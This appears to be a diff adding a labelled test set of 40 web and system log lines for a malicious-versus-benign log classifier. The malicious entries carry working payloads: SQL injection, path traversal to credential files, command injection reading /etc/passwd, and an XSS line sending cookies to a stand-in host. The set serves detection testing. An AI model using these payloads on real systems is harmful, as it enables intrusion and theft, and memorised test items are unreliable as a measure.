@@ -1,0 +1,282 @@
+[
+ {
+  "log": "203.0.113.11 - - [12/Nov/2026:10:21:07 +0900] \"GET /item?id=1%27%20oR%20%271%27%3D%271 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "sqli",
+  "level": "hard",
+  "id": 0
+ },
+ {
+  "log": "203.0.113.12 - - [12/Nov/2026:10:21:07 +0900] \"GET /item?id=1%2527%2520UnIoN%2520SeLeCt%2520NULL,NULL-- HTTP/1.1\" 500 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "sqli",
+  "level": "hard",
+  "id": 1
+ },
+ {
+  "log": "203.0.113.14 - - [12/Nov/2026:10:21:07 +0900] \"GET /item?id=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "sqli",
+  "level": "hard",
+  "id": 2
+ },
+ {
+  "log": "198.51.100.5 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "xss",
+  "level": "hard",
+  "id": 3
+ },
+ {
+  "log": "198.51.100.6 - - [12/Nov/2026:10:21:07 +0900] \"GET /go?url=javascript:alert(1) HTTP/1.1\" 302 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "xss",
+  "level": "hard",
+  "id": 4
+ },
+ {
+  "log": "192.0.2.23 - - [12/Nov/2026:10:21:07 +0900] \"GET /static/..%252f..%252fwindows/win.ini HTTP/1.1\" 400 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "traversal",
+  "level": "hard",
+  "id": 5
+ },
+ {
+  "log": "192.0.2.24 - - [12/Nov/2026:10:21:07 +0900] \"GET /view?page=....//....//etc/hosts HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "traversal",
+  "level": "hard",
+  "id": 6
+ },
+ {
+  "log": "192.0.2.34 - - [12/Nov/2026:10:21:07 +0900] \"GET /ping?host=127.0.0.1%0Aid HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "cmdi",
+  "level": "hard",
+  "id": 7
+ },
+ {
+  "log": "Nov 12 10:23:55 web01 app: password spraying suspected: 'Summer2026!' tried against 212 accounts from 198.51.100.78",
+  "label": "MALICIOUS",
+  "kind": "brute",
+  "level": "hard",
+  "id": 8
+ },
+ {
+  "log": "Nov 12 10:24:30 web01 app: 17 failed logins for 'alice' over 6 hours from 17 different countries",
+  "label": "MALICIOUS",
+  "kind": "brute",
+  "level": "hard",
+  "id": 9
+ },
+ {
+  "log": "203.0.113.93 - - [12/Nov/2026:10:21:07 +0900] \"GET /phpmyadmin/index.php HTTP/1.1\" 404 512 \"-\" \"python-requests/2.31\"",
+  "label": "MALICIOUS",
+  "kind": "scanner",
+  "level": "hard",
+  "id": 10
+ },
+ {
+  "log": "203.0.113.94 - - [12/Nov/2026:10:21:07 +0900] \"GET /actuator/env HTTP/1.1\" 404 512 \"-\" \"curl/8.4.0\"",
+  "label": "MALICIOUS",
+  "kind": "scanner",
+  "level": "hard",
+  "id": 11
+ },
+ {
+  "log": "Nov 12 10:22:41 web01 sshd[2231]: Failed password for invalid user admin from 203.0.113.51 port 50122 ssh2 (attempt 87 in 2 min)",
+  "label": "MALICIOUS",
+  "kind": "brute",
+  "level": "easy",
+  "id": 12
+ },
+ {
+  "log": "Nov 12 10:22:01 web01 sshd[2211]: 143 failed password attempts for root from 203.0.113.50 within 60s",
+  "label": "MALICIOUS",
+  "kind": "brute",
+  "level": "easy",
+  "id": 13
+ },
+ {
+  "log": "203.0.113.13 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=1' AND SLEEP(5)-- HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "sqli",
+  "level": "easy",
+  "id": 14
+ },
+ {
+  "log": "192.0.2.31 - - [12/Nov/2026:10:21:07 +0900] \"GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "cmdi",
+  "level": "easy",
+  "id": 15
+ },
+ {
+  "log": "198.51.100.3 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "xss",
+  "level": "easy",
+  "id": 16
+ },
+ {
+  "log": "192.0.2.21 - - [12/Nov/2026:10:21:07 +0900] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "traversal",
+  "level": "easy",
+  "id": 17
+ },
+ {
+  "log": "203.0.113.91 - - [12/Nov/2026:10:21:07 +0900] \"GET /.git/config HTTP/1.1\" 404 512 \"-\" \"Mozilla/5.0 zgrab/0.x\"",
+  "label": "MALICIOUS",
+  "kind": "scanner",
+  "level": "easy",
+  "id": 18
+ },
+ {
+  "log": "198.51.100.4 - - [12/Nov/2026:10:21:07 +0900] \"GET /profile?name=<img src=x onerror=fetch('//x.example/?c='+document.cookie)> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "MALICIOUS",
+  "kind": "xss",
+  "level": "easy",
+  "id": 19
+ },
+ {
+  "log": "10.0.1.23 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=%ED%95%9C%EC%84%B1%EB%8C%80%ED%95%99%EA%B5%90 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 20
+ },
+ {
+  "log": "10.0.1.24 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=O'Reilly+books HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 21
+ },
+ {
+  "log": "10.0.1.25 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=how+to+drop+shipping+business HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 22
+ },
+ {
+  "log": "10.0.1.26 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=union+station+schedule HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 23
+ },
+ {
+  "log": "10.0.1.27 - - [12/Nov/2026:10:21:07 +0900] \"GET /search?q=select+committee+report HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 24
+ },
+ {
+  "log": "10.0.1.28 - - [12/Nov/2026:10:21:07 +0900] \"GET /blog/script-writing-tips HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 25
+ },
+ {
+  "log": "10.0.1.29 - - [12/Nov/2026:10:21:07 +0900] \"POST /api/comments HTTP/1.1 body: {\"text\":\"1 < 2 and 3 > 2, 맞죠?\"}\" 201 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 26
+ },
+ {
+  "log": "Nov 12 10:30:44 web01 sshd[2305]: Failed password for alice from 10.0.0.7 port 50301 ssh2 (attempt 1)",
+  "label": "BENIGN",
+  "kind": "auth",
+  "level": "hard",
+  "id": 27
+ },
+ {
+  "log": "Nov 12 10:33:05 web01 app: 3 failed logins for 'carol' within 10 min, then success from same IP 10.0.0.12",
+  "label": "BENIGN",
+  "kind": "auth",
+  "level": "hard",
+  "id": 28
+ },
+ {
+  "log": "Nov 12 10:34:20 db01 postgres[881]: LOG: duration: 4.2 ms statement: SELECT id,name FROM products WHERE id = $1",
+  "label": "BENIGN",
+  "kind": "system",
+  "level": "hard",
+  "id": 29
+ },
+ {
+  "log": "Nov 12 10:36:44 web01 app: scheduled vulnerability scan by Nessus from 10.0.5.9 started (change ticket CHG-2231)",
+  "label": "BENIGN",
+  "kind": "system",
+  "level": "hard",
+  "id": 30
+ },
+ {
+  "log": "10.0.1.40 - - [12/Nov/2026:10:21:07 +0900] \"GET /admin/users HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0 (admin console, SSO)\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 31
+ },
+ {
+  "log": "10.0.1.42 - - [12/Nov/2026:10:21:07 +0900] \"GET /static/../static/app.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "hard",
+  "id": 32
+ },
+ {
+  "log": "10.0.1.22 - - [12/Nov/2026:10:21:07 +0900] \"GET /download?file=report_2026_Q3.pdf HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "easy",
+  "id": 33
+ },
+ {
+  "log": "Nov 12 10:31:55 web01 app: admin 'kim.ops' logged in from office IP 10.0.0.2",
+  "label": "BENIGN",
+  "kind": "auth",
+  "level": "easy",
+  "id": 34
+ },
+ {
+  "log": "10.0.1.20 - - [12/Nov/2026:10:21:07 +0900] \"GET /robots.txt HTTP/1.1\" 200 512 \"-\" \"Googlebot/2.1\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "easy",
+  "id": 35
+ },
+ {
+  "log": "10.0.1.21 - - [12/Nov/2026:10:21:07 +0900] \"GET /favicon.ico HTTP/1.1\" 404 512 \"-\" \"Mozilla/5.0\"",
+  "label": "BENIGN",
+  "kind": "normal",
+  "level": "easy",
+  "id": 36
+ },
+ {
+  "log": "Nov 12 10:36:02 fw01 ufw: [UFW ALLOW] IN=eth0 SRC=10.0.0.30 DST=10.0.1.5 PROTO=TCP DPT=443",
+  "label": "BENIGN",
+  "kind": "system",
+  "level": "easy",
+  "id": 37
+ },
+ {
+  "log": "Nov 12 10:35:40 web01 kernel: eth0: link up 1000 Mbps full duplex",
+  "label": "BENIGN",
+  "kind": "system",
+  "level": "easy",
+  "id": 38
+ },
+ {
+  "log": "Nov 12 10:35:11 web01 cron[301]: (root) CMD (/usr/local/bin/backup.sh)",
+  "label": "BENIGN",
+  "kind": "system",
+  "level": "easy",
+  "id": 39
+ }
+]
